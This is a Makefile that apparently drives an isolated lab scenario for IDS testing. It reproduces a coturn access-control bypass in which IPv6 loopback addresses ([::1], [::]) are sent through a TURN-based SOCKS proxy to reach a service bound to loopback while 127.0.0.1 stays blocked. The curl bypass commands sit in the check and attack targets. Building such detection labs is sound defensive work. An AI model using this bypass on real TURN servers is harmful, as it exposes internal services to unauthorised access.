STACK_ID := 5_coturn_access_bypass
DRY_RUN_TAG := RTC_DRY_RUN
SCENARIO ?= 5
ATTACK_TYPE := coturn_access_bypass
EXPECTED_SIDS := 2000005
DISABLE_SHARED_LIFECYCLE_TARGETS := 1
include ../shared.mk

SERVICE ?=
NET_PREFIX ?= 10.14.$(INSTANCE_INDEX)
LAB_SUBNET ?= $(NET_PREFIX).0/24
COTURN_IP ?= $(NET_PREFIX).5
STUNNER_IP ?= $(NET_PREFIX).10
CHECK_WAIT_SEC ?= 8

export LAB_SUBNET COTURN_IP STUNNER_IP

run:
	@$(COMPOSE) up -d --remove-orphans

start: run

stop:
	@$(COMPOSE) down --remove-orphans

follow-coturn:
	@$(COMPOSE) logs --follow coturn

start-stunner:
	# Previous implementation kept for traceability:
	# @docker exec -it stunner sh
	# Change rationale: service-scoped exec targets the selected Compose project instance.
	@$(COMPOSE) exec stunner sh

rebuild:
	@$(COMPOSE) down --rmi all --remove-orphans || true
	@$(COMPOSE) build --no-cache $(SERVICE)
build:
	@$(COMPOSE) build --no-cache $(SERVICE)


dry-run:
	@echo "$(DRY_RUN_TAG)_BEGIN stack=$(STACK_ID)"
	@$(MAKE) coturn-http-stop >/dev/null 2>&1 || true
	@$(MAKE) coturn-http-start >/dev/null
	@sleep 1
	@$(COMPOSE) exec -T coturn sh -lc "curl -g -fsS --max-time 5 'http://[::1]:8000/' >/dev/null" || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=coturn_loopback_http reason=unreachable"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=coturn_loopback_http"
	@$(COMPOSE) exec -T coturn sh -lc "python3 -c \"import socket; s=socket.create_connection(('127.0.0.1', 3478), 5); s.close()\"" >/dev/null 2>&1 || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=coturn_turn_listener reason=connection_failed"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=coturn_turn_listener"
	@$(COMPOSE) exec -T stunner sh -lc "curl -g -fsS --max-time 8 -x socks5h://127.0.0.1:9999 'http://[::1]:8000/' >/dev/null" || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=stunner_socks_path reason=proxy_unusable"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=stunner_socks_path"
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) ready=true"

coturn-http-start:
	@echo "[*] Starting loopback HTTP server on coturn (::1:8000)..."
	@$(COMPOSE) exec -d coturn sh -lc "python3 -m http.server 8000 --bind ::1 >/tmp/coturn-http.log 2>&1"

coturn-http-stop:
	@$(COMPOSE) exec -T coturn sh -lc "ps -eo pid,args | grep 'http.server 8000 --bind ::1' | grep -v grep | awk '{print \$$1}' | xargs -r kill -TERM || true"

check-loopback-blocked:
	@echo "[*] Check 1/3: 127.0.0.1 should be blocked..."
	@if $(COMPOSE) exec -T stunner sh -lc "curl -fsS --max-time 5 -x socks5h://127.0.0.1:9999 http://127.0.0.1:8000 >/tmp/check1.out 2>/tmp/check1.err"; then \
		echo "[!] FAIL: request to 127.0.0.1 unexpectedly succeeded."; \
		exit 1; \
	else \
		echo "[+] PASS: 127.0.0.1 blocked as expected."; \
	fi

check-ipv6-loopback-bypass:
	@echo "[*] Check 2/3: [::1] bypass should succeed..."
	@$(COMPOSE) exec -T stunner sh -lc "curl -fsS --max-time 8 -x socks5h://127.0.0.1:9999 'http://[::1]:8000/' >/tmp/check2.out"
	@echo "[+] PASS: [::1] bypass succeeded."

check-ipv6-any-bypass:
	@echo "[*] Check 3/3: [::] bypass should succeed..."
	@$(COMPOSE) exec -T stunner sh -lc "curl -fsS --max-time 8 -x socks5h://127.0.0.1:9999 'http://[::]:8000/' >/tmp/check3.out"
	@echo "[+] PASS: [::] bypass succeeded."

bypass-check:
	@$(MAKE) check-loopback-blocked
	@$(MAKE) check-ipv6-loopback-bypass
	@$(MAKE) check-ipv6-any-bypass

auto-attack: stop build start
	@$(RTC_EVENT) lab_ready stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) \
		attacker_ip=$(STUNNER_IP) victim_ip=$(COTURN_IP) \
		expected_sids=$(EXPECTED_SIDS) attack_type=$(ATTACK_TYPE) \
		probe_targets=$(STUNNER_IP),$(COTURN_IP) probe_protocols=tcp,udp,icmp
	@echo "[*] Waiting for coturn/stunner readiness ($(CHECK_WAIT_SEC)s)..."
	@sleep $(CHECK_WAIT_SEC)
	@$(MAKE) attack
	@$(RTC_EVENT) lab_stop stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE)

attack:
	@$(MAKE) coturn-http-stop
	@$(MAKE) coturn-http-start
	@sleep 1
	@echo "$(ATTACK_WINDOW_TAG)_BEGIN ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE)"
	@$(MAKE) bypass-check
	@echo "$(ATTACK_WINDOW_TAG)_END ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE)"
